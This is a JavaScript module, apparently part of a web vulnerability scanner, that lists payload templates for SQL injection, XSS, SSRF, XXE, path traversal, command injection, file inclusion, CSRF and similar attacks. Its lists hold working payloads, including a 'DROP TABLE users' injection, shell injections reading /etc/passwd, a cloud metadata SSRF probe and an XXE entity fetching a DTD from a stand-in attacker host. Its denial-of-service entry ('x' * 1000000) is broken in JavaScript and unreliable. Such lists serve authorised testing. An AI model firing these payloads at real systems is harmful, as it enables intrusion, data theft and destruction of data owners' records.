// Phase 2: Vulnerability Templates - Library of vulnerability types
class VulnerabilityTemplates {
  static getTemplates() {
    return {
      'SQLi': {
        name: 'SQL Injection',
        description: 'SQL Injection allows attackers to manipulate database queries',
        payloads: [
          "' OR '1'='1",
          "admin' --",
          "1' UNION SELECT NULL--",
          "1; DROP TABLE users--",
          "' OR 1=1 --",
          "1' AND '1'='1",
          "1' OR 'a'='a",
          "' or 1=1#"
        ],
        detectionStrings: ['mysql_error', 'syntax error', 'SQL error', 'ORA-', 'PostgreSQL error'],
        severity: 'CRITICAL'
      },

      'XSS': {
        name: 'Cross-Site Scripting',
        description: 'XSS allows injection of malicious scripts into web pages',
        payloads: [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
          '"><script>alert(1)</script>',
          '<iframe src="javascript:alert(1)">',
          '<body onload=alert(1)>',
          '<input onfocus=alert(1) autofocus>',
          '<select onfocus=alert(1) autofocus>',
          '<textarea onfocus=alert(1) autofocus>',
          '<marquee onstart=alert(1)>',
          'javascript:alert(1)',
          '<img src=1 onerror=alert(1)>'
        ],
        detectionStrings: ['<script>', 'alert(', 'onerror=', 'onload='],
        severity: 'HIGH'
      },

      'SSRF': {
        name: 'Server-Side Request Forgery',
        description: 'SSRF allows attackers to make server perform requests to internal systems',
        payloads: [
          'http://localhost/admin',
          'http://127.0.0.1:8080',
          'http://192.168.1.1',
          'http://169.254.169.254/latest/meta-data/',
          'http://0.0.0.0',
          'http://[::1]',
          'gopher://localhost:25',
          'dict://localhost:11211',
          'file:///etc/passwd'
        ],
        detectionStrings: ['localhost', 'internal', 'forbidden', 'admin panel'],
        severity: 'HIGH'
      },

      'XXE': {
        name: 'XML External Entity Injection',
        description: 'XXE allows reading files and SSRF attacks through XML parsing',
        payloads: [
          '<?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
          '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
          '<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>'
        ],
        detectionStrings: ['DOCTYPE', 'ENTITY', 'XML', 'payload'],
        severity: 'HIGH'
      },

      'PathTraversal': {
        name: 'Path Traversal',
        description: 'Path traversal allows reading arbitrary files on the server',
        payloads: [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\win.ini',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '..;/..;/..;/etc/passwd',
          '..%252f..%252fetc%252fpasswd',
          '....%2fpasswd',
          'file:///etc/passwd'
        ],
        detectionStrings: ['passwd', 'win.ini', 'boot.ini', 'root:'],
        severity: 'HIGH'
      },

      'RCE': {
        name: 'Remote Code Execution',
        description: 'RCE allows attackers to execute arbitrary code on the server',
        payloads: [
          '; whoami',
          '| id',
          '$(whoami)',
          '`whoami`',
          '$(cat /etc/passwd)',
          '; cat /etc/passwd',
          '| cat /etc/passwd',
          'command injection test'
        ],
        detectionStrings: ['uid=', 'gid=', 'groups=', 'root', 'www-data'],
        severity: 'CRITICAL'
      },

      'LFI': {
        name: 'Local File Inclusion',
        description: 'LFI allows inclusion and execution of local files',
        payloads: [
          'php://filter/convert.base64-encode/resource=/etc/passwd',
          'php://input',
          '/etc/passwd',
          'file:///etc/passwd',
          '../../../etc/passwd',
          '....//....//etc/passwd'
        ],
        detectionStrings: ['root:', 'passwd', 'include'],
        severity: 'HIGH'
      },

      'CSRF': {
        name: 'Cross-Site Request Forgery',
        description: 'CSRF allows attackers to perform actions on behalf of users',
        payloads: [
          '<img src="http://target.com/admin/delete.php?id=1">',
          '<form action="http://target.com/transfer" method="POST"><input type="hidden" name="amount" value="1000"></form>',
          '<script>fetch("http://target.com/api/admin", {method: "DELETE"})</script>'
        ],
        detectionStrings: [],
        severity: 'MEDIUM'
      },

      'AuthBypass': {
        name: 'Authentication Bypass',
        description: 'Authentication bypass allows access without proper credentials',
        payloads: [
          "' OR '1'='1",
          "admin' --",
          "' OR 1=1 --",
          "admin",
          "password",
          "123456",
          "null"
        ],
        detectionStrings: ['success', 'welcome', 'dashboard', 'admin'],
        severity: 'CRITICAL'
      },

      'PrivilegeEscalation': {
        name: 'Privilege Escalation',
        description: 'Privilege escalation allows gaining higher privileges',
        payloads: [
          'admin=true',
          'role=administrator',
          'is_admin=1',
          'privilege=99'
        ],
        detectionStrings: ['admin', 'administrator', 'root', 'privileged'],
        severity: 'HIGH'
      },

      'InfoDisclosure': {
        name: 'Information Disclosure',
        description: 'Information disclosure exposes sensitive data',
        payloads: [
          '../.env',
          '/.env',
          '/../.env',
          '/.git',
          '/.git/config',
          '/web.config'
        ],
        detectionStrings: ['DATABASE_URL', 'API_KEY', 'SECRET', 'PASSWORD'],
        severity: 'MEDIUM'
      },

      'DoS': {
        name: 'Denial of Service',
        description: 'DoS allows disruption of service availability',
        payloads: [
          'x' * 1000000,
          '<svg onload=while(1){alert(1)}>'
        ],
        detectionStrings: ['timeout', 'error 500', 'service unavailable'],
        severity: 'MEDIUM'
      },

      'BrokenAuth': {
        name: 'Broken Authentication',
        description: 'Broken authentication weaknesses in credential management',
        payloads: [
          'userID=1',
          'userID=2',
          'userID=admin',
          'reset_token=invalid'
        ],
        detectionStrings: ['authenticated', 'session', 'token'],
        severity: 'HIGH'
      }
    };
  }

  /**
   * Get specific vulnerability template
   */
  static getTemplate(vulnType) {
    const templates = this.getTemplates();
    return templates[vulnType] || null;
  }

  /**
   * Get all vulnerability types
   */
  static getVulnerabilityTypes() {
    return Object.keys(this.getTemplates());
  }

  /**
   * Get templates by severity
   */
  static getTemplatesBySeverity(severity) {
    const templates = this.getTemplates();
    return Object.entries(templates)
      .filter(([_, template]) => template.severity === severity)
      .map(([type, template]) => ({ type, ...template }));
  }

  /**
   * Generate payload set for endpoint
   */
  static generatePayloadSet(vulnerabilityTypes = null) {
    const templates = this.getTemplates();
    const types = vulnerabilityTypes || Object.keys(templates);

    const payloads = {};
    types.forEach(type => {
      if (templates[type]) {
        payloads[type] = templates[type].payloads;
      }
    });

    return payloads;
  }
}

module.exports = VulnerabilityTemplates;
